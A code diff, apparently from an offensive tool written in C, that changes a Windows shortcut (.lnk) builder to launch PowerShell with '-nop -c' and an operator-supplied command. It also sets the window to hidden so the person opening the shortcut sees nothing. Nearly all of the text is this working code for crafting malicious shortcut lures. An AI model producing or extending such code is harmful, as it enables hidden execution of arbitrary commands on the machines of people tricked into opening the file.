@@ -31,10 +31,32 @@ int checkOutputPath(char *outputPath){
 int createTheLNKArguments(HRESULT hr, IShellLinkW *pShellLink, char *arguments){
 
     //this set the path to the link, for now only execute cmd
-    hr = pShellLink->lpVtbl->SetPath(pShellLink, L"C:\\Windows\\System32\\cmd.exe");
+    hr = pShellLink->lpVtbl->SetPath(pShellLink, L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
 
     if (FAILED(hr)){
         printf("[-] ERROR: cannot setPath to lnk\n");
+        return 1;
+    }
+
+    //change the format
+    wchar_t wUserArgument[256];
+    MultiByteToWideChar(CP_ACP, 0, arguments, -1, wUserArgument, 256);
+
+    //arguments for command
+    wchar_t wArguments[512];
+    swprintf(wArguments, 512, L"-nop -c \"%S\"", wUserArgument);
+
+
+    hr = pShellLink->lpVtbl->SetArguments(pShellLink, wArguments);
+    if (FAILED(hr)) {
+        printf("[-] ERROR: cannot setArguments to lnk\n");
+        return 1;
+    }
+
+    //this is for not spawning for 1 sec at the beginning the cmd
+    hr = pShellLink->lpVtbl->SetShowCmd(pShellLink, SW_HIDE);
+    if (FAILED(hr)) {
+        printf("[-] ERROR: cannot set show command\n");
         return 1;
     }
 
